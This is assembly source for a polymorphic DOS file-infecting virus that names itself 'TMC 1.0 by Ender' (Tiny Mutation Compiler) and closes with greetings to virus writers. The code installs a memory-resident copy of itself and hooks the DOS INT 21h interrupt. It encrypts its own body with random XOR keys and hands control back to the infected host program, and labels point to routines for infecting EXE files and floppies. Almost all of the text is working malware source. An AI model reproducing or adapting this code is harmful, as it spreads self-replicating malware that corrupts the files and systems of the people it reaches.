;DEBUG = 1

START_JMPS              EQU     50
NO_TEXT                 EQU     20
BAD_CLEAN               EQU     20
MIN_JMPS                EQU     5
MAX_JMPS                EQU     100

mem4compile             EQU     (8000d + @free) / 10h
;                                 ^^^^ maximalny najvecsi vystupny kod

@next_in_block          EQU     3000
@code_cmd               EQU     3001
@no_stop                EQU     3002
@no_block               EQU     3003
@end_in_block           EQU     3004
@next_block             EQU     3005
@next_search_block      EQU     3006
@no_last_block          EQU     3007
@no_stoped              EQU     3008
@next_inst              EQU     3009
@no_break               EQU     3010
@no_sub_size_data       EQU     3011
@code_cmd1              EQU     3012
@no_relo1               EQU     3013
@no_put_src             EQU     3014
@no_block1              EQU     3015
@no_last_but_end        EQU     3016
@no_next_inst           EQU     3017
@no_next_block          EQU     3018
@next_jump_relo         EQU     3019
@next_jmp_in_out        EQU     3020
@jmp_found              EQU     3021
@over_jmp               EQU     3022
@jmp1                   EQU     3023
@next_j_relo            EQU     3024
@next_data_relo         EQU     3025
@next_data_in_out       EQU     3026
@found                  EQU     3027
@rnd                    EQU     3028
@rnd_max                EQU     3029
@rnd_max_0              EQU     3030
@copy_next_byte         EQU     3050
@no_special             EQU     3051
@JMPS                   EQU     3052
@no_put_text            EQU     3053

exit                    EQU     3054
save_ds                 EQU     3055
vir_size                EQU     3056
ofs_in_mem              EQU     3057

int24                   EQU     6000
no_inf_int24            EQU     6001
end_of_compile          EQU     6002
_old_ip                 EQU     6003
clean_ofajc             EQU     6004
_old_inst               EQU     6006

jmps_no_over            EQU     3061

crypt_data              EQU     3070
crypt_next_byte         EQU     3071

text_text               EQU     9000

xor_const               EQU     3031
xor_add                 EQU     3032
save_ah                 EQU     3033

read_byte               EQU     3040
read_word               EQU     3041

filetype                EQU     5000
old_cs                  EQU     5001
old_ss                  EQU     5002
old_ip                  EQU     5003
old_sp                  EQU     5004
exe_infect              EQU     5005
set_marker              EQU     5006
exe_header              EQU     5007
install                 EQU     5008
old_entry               EQU     5009
infect                  EQU     5010

min_mem                 EQU     5011
max_mem                 EQU     5012
old_max_mem             EQU     5013
write_exeh              EQU     5014
str_start               EQU     5015
prepare_str             EQU     5016
max_mem_FFFF            EQU     5017
infect_floppy           EQU     5018
no_drive_pressed        EQU     5019
infect_close            EQU     5020
handle                  EQU     5021
path                    EQU     5022
psp                     EQU     5023
push_all                EQU     5024
pop_all                 EQU     5025
int24_seg               EQU     5026
int24_ofs               EQU     5027
init_int24              EQU     5028
deinit_int24            EQU     5029
call_int21              EQU     5030
infect_in_close         EQU     5032
infect_and_call_int21   EQU     5033
exit_adr                EQU     5034
check4handle            EQU     5035
new_psp                 EQU     5036
ticks                   EQU     5037
no_short_exe            EQU     5038
no_com_ojeb             EQU     5039

@compile                EQU     4000
@link                   EQU     4001

src_src                 EQU     1221
int21                   EQU     0200
old21                   EQU     0201

file_ok                 EQU     0240
close                   EQU     0250
no_inf                  EQU     0251

time                    EQU     0300
date                    EQU     0301

old_prog                EQU     0101

_start                  EQU     0000
in_mem                  EQU     0102

old_inst                EQU     8000


;============================ CODE ======================================
src:
src_startup:
BLOCK   _start
      ; lea     bp, [1234h]
I<      dw      02e8dh, 1234h                                           >
I<      cld                                                             >

I<      mov     ax, ds                                                  >
I<      mov     word ptr [bp+1234h], ax                                 >
RELO    save_ds
I<      dec     ax                                                      >
I<      mov     ds, ax                                                  >
I<      mov     ax, word ptr ds:[3]                                     >
I<      cmp     ax, 1900h                                               >
        _JB     exit
I<      push    cs                                                      >
I<      pop     ds                                                      >
I<      mov     word ptr [bp+1234h], ax                                 >
RELO    max_mem

I<      mov     bx, word ptr [bp+1234h]                                 >
RELO    min_mem
I<      mov     ah, 4ah                                                 >
I<      int     21h                                                     >
        _JC     exit

I<      mov     ah, 48h                                                 >
I<      mov     bx, word ptr [bp+1234h]                                 >
RELO    max_mem
I<      sub     bx, word ptr [bp+1234h]                                 >
RELO    min_mem
I<      dec     bx                                                      >
I<      cmp     bx, mem4compile                                         >
        _JB     exit
I<      int     21h                                                     >
        _JC     exit
I<      mov     es, ax                                                  >
I<      add     word ptr es:[@last_rnd], 06942h                         >

        include src\compiler.inc

BLOCK   end_of_compile
I<      mov     ax, [bp+1234h]                                          >
RELO    save_ds
I<      mov     cx, [bp+1234h]                                          >
RELO    old_ss
I<      add     cx, 10h                                                 >
I<      add     cx, ax                                                  >
I<      push    cx                                                      >
I<      push    word ptr [bp+1234h]                                     >
RELO    old_sp
I<      mov     cx, [bp+1234h]                                          >
RELO    old_cs
I<      add     cx, 10h                                                 >
I<      add     cx, ax                                                  >
I<      push    cx                                                      >
I<      push    word ptr [bp+1234h]                                     >
RELO    old_ip
I<      push    ax                                                      >
I<      push    word ptr [bp + 1234h]                                   >
RELO    old_max_mem
I<      push    ds                                                      >
I<      mov     cl, 0                                                   >
I<      cmp     byte ptr [bp+1234h], cl                                 >
RELO    filetype
        _JNZ    install

I<      lea     si, [bp+1234h]                                          >
RELO    old_inst
I<      mov     ax, cs:[si]                                             >
I<      mov     word ptr cs:[100h], ax                                  >
I<      mov     al, cs:[si+2]                                           >
I<      mov     byte ptr cs:[102h], al                                  >
        JUMP    install

BLOCK   clean_ofajc
I<      mov     ax, [bp+1234h]                                          >
RELO    save_ds
I<      mov     cx, [bp+1234h]                                          >
RELO    old_ss
I<      add     cx, 10h                                                 >
I<      add     cx, ax                                                  >
I<      push    cx                                                      >
I<      push    word ptr [bp+1234h]                                     >
RELO    old_sp
I<      mov     cx, [bp+1234h]                                          >
RELO    old_cs
I<      add     cx, 10h                                                 >
I<      add     cx, ax                                                  >
I<      push    cx                                                      >
I<      push    word ptr [bp+1234h]                                     >
RELO    _old_ip
I<      push    ax                                                      >
I<      push    word ptr [bp + 1234h]                                   >
RELO    old_max_mem
I<      push    ds                                                      >
I<      mov     cl, 0                                                   >
I<      cmp     byte ptr [bp+1234h], cl                                 >
RELO    filetype
        _JNZ    install

I<      lea     si, [bp+1234h]                                          >
RELO    _old_inst
I<      mov     ax, cs:[si]                                             >
I<      mov     word ptr cs:[100h], ax                                  >
I<      mov     al, cs:[si+2]                                           >
I<      mov     byte ptr cs:[102h], al                                  >
        JUMP    install

BLOCK   install
I<      xor     ax, ax                                                  >
I<      mov     ds, ax                                                  >
I<      cmp     byte ptr ds:[501h], 10h                                 >
        _JZ     old_prog

ifndef  DEBUG
I<      mov     byte ptr ds:[501h], 10h                                 >
endif

I<      push    es                                                      >
I<      pop     ds                                                      >

I<      mov     ax, ds:[in_mem_ofs]                                     >
I<      sub     ax, @free                                               >
I<      mov     [bp+1234h], ax                                          >
RELO    ofs_in_mem
I<      mov     cx, ds:[new_vir_size]                                   >
I<      mov     [bp+1234h], cx                                          >
RELO    vir_size
I<      mov     si, @free                                               >
I<      xor     di, di                                                  >
I<      rep     movsb                                                   >

I<      mov     cl, 4                                                   >
I<      shr     di, cl                                                  >
I<      inc     di                                                      >
I<      mov     bx, [bp+1234h]                                          >
RELO    max_mem
I<      sub     bx, [bp+1234h]                                          >
RELO    min_mem
I<      sub     bx, di                                                  >
I<      dec     bx                                                      >
I<      dec     bx                                                      >
I<      cmp     bx, di                                                  >
        _JB     old_prog
I<      mov     ah, 4ah                                                 >
I<      int     21h                                                     >
        _JC     old_prog
I<      mov     bx, di                                                  >
I<      mov     ah, 48h                                                 >
I<      int     21h                                                     >
        _JC     old_prog

I<      dec     ax                                                      >
I<      mov     es, ax                                                  >
I<      mov     word ptr es:[1], 8                                      >
I<      inc     ax                                                      >
I<      mov     es, ax                                                  >

I<      mov     cx, [bp+1234h]                                          >
RELO    vir_size
I<      xor     si, si                                                  >
I<      xor     di, di                                                  >
I<      rep     movsb                                                   >

I<      push    es                                                      >

I<      push    word ptr [bp + 1234h]                                   >
RELO    ofs_in_mem
I<      mov     al, [bp + 1234h]                                        >
RELO    xor_const
I<      mov     ah, [bp + 1234h]                                        >
RELO    xor_add
I<      retf                                                            >

BLOCK   exit
I<      mov     ax, 4c00h                                               >
I<      int     21h                                                     >

BLOCK   @rnd
I<      push    cx                                                      >
I<      in      al, 40h                                                 >
;I<      mov     al, 0                                                   >
I<      mov     ah, al                                                  >
I<      in      al, 40h                                                 >
;I<      mov     al, 0                                                   >
I<      xor     ax, es:[@last_rnd]                                      >
I<      mov     cl, ah                                                  >
I<      rol     ax, cl                                                  >
I<      mov     es:[@last_rnd], ax                                      >
I<      pop     cx                                                      >
I<      ret                                                             >

BLOCK   @rnd_max
I<      or      bp, bp                                                  >
        _JZ     @rnd_max_0
I<      push    dx                                                      >
        CALLL   @rnd
;I<      mov     ax, 1                                                   >
I<      xor     dx, dx                                                  >
I<      div     bp                                                      >
I<      xchg    ax, dx                                                  >
I<      pop     dx                                                      >
I<      ret                                                             >

BLOCK   @rnd_max_0
I<      xor     ax, ax                                                  >
I<      ret                                                             >

BLOCK   read_byte
I<      mov     [bp + 1234h], ah                                        >
RELO    save_ah
I<      mov     ax, si                                                  >
I<      sub     ax, bp                                                  >
I<      sub     ax, 1234h                                               >
RELO    src_src
I<      mul     word ptr [bp + 1234h]                                   >
RELO    xor_add
I<      add     al, [bp + 1234h]                                        >
RELO    xor_const
I<      xor     al, ds:[si]                                             >
I<      mov     ah, [bp + 1234h]                                        >
RELO    save_ah
I<      inc     si                                                      >
I<      ret                                                             >

BLOCK   read_word
        CALLL   read_byte
I<      mov     ah, al                                                  >
        CALLL   read_byte
I<      xchg    al, ah                                                  >
I<      ret                                                             >

BLOCK   old_prog
I<      pop     es                                                      >
I<      mov     ah, 49h                                                 >
I<      int     21h                                                     >
I<      pop     bx                                                      >
I<      pop     ax                                                      >
I<      mov     ds, ax                                                  >
I<      mov     es, ax                                                  >
I<      mov     ah, 4ah                                                 >
I<      int     21h                                                     >

I<      lea     bx, [bp + 1234h]                                        >
RELO    old_entry
I<      pop     ax                                                      >
I<      mov     cs:[bx+1], ax                                           >
I<      pop     ax                                                      >
I<      mov     cs:[bx+3], ax                                           >

I<      pop     ax                                                      >
I<      pop     ss                                                      >
I<      mov     sp, ax                                                  >
        JUMP    old_entry

BLOCK   old_entry
D<      db      0EAh, 0, 0, 0, 0                                        >

;============================ DATA ======================================
BLOCK   save_ah
D<      db      0                                                       >
BLOCK   @JMPS
D<      dw      START_JMPS                                              >
BLOCK   xor_const
D<      db      0                                                       >
BLOCK   xor_add
D<      dw      0                                                       >
BLOCK   filetype
D<      db      0                                                       >
BLOCK   old_inst
D<      db      0c3h, 0, 0                                              >
BLOCK   _old_inst
D<      db      0c3h, 0, 0                                              >
BLOCK   old_cs
D<      dw      -10h                                                    >
BLOCK   old_ss
D<      dw      -10h                                                    >
BLOCK   old_ip
D<      dw      100h                                                    >
BLOCK   _old_ip
D<      dw      100h                                                    >
BLOCK   old_sp
D<      dw      0fffeh                                                  >
BLOCK   min_mem
D<      dw      1000h                                                   >
BLOCK   old_max_mem
D<      dw      0ffffh                                                  >
BLOCK   max_mem
D<      dw      0                                                       >
BLOCK   save_ds
D<      dw      0                                                       >
BLOCK   vir_size
D<      dw      0                                                       >
BLOCK   ofs_in_mem
D<      dw      0                                                       >
BLOCK   src_src
db      M_STOP, M_END

;============================ CODE ======================================
src_vir:
BLOCK   in_mem
I<      xor     bp, bp                                                  >
I<      mov     ds, bp                                                  >
I<      mov     bx, ds:[46Dh]                                           >
I<      push    cs                                                      >
I<      pop     ds                                                      >
I<      and     bx, 0FFF0h                                              >
I<      mov     ds:[1234h], bx                                          >
RELO    ticks
        CALLL   crypt_data
        CALLL   @rnd
I<      mov     ds:[1234h], al                                          >
RELO    xor_const
I<      mov     ds:[1234h], ah                                          >
RELO    xor_add
        CALLL   crypt_data
I<      mov     ax, 3521h                                               >
I<      int     21h                                                     >
I<      mov     di, 1234h                                               >
RELO    old21
I<      mov     word ptr ds:[di], bx                                    >
I<      mov     word ptr ds:[di+2], es                                  >
I<      mov     dx, 1234h                                               >
RELO    int21
I<      mov     ax, 2521h                                               >
I<      int     21h                                                     >
        JUMP    old_prog

BLOCK   crypt_data
I<      mov     si, 1234h                                               >
RELO    src_src
I<      mov     cx, offset src_end - offset src                         >
        JUMP    crypt_next_byte

BLOCK   crypt_next_byte
I<      xor     ds:[si], al                                             >
I<      inc     si                                                      >
I<      add     al, ah                                                  >
I<      dec     cx                                                      >
        _JNZ    crypt_next_byte
I<      ret                                                             >

        include src\tsr.inc

;============================ DATA ======================================
BLOCK   text_text
D<      db      13, 10, 13, 10, 'þ TMC 1.0 by Ender þ', 13, 10, 'Welcome to the Tiny Mutation Compiler!', 13, 10, 'Dis is level 6*9.', 13, 10, 'Greetings to virus makers: Dark Avenger, Vyvojar, SVL, Hell Angel', 13, 10, 'Personal greetings: K. K., Dark Punisher',13, 10, 13, 10 >
db      M_STOP, M_END
src_end:
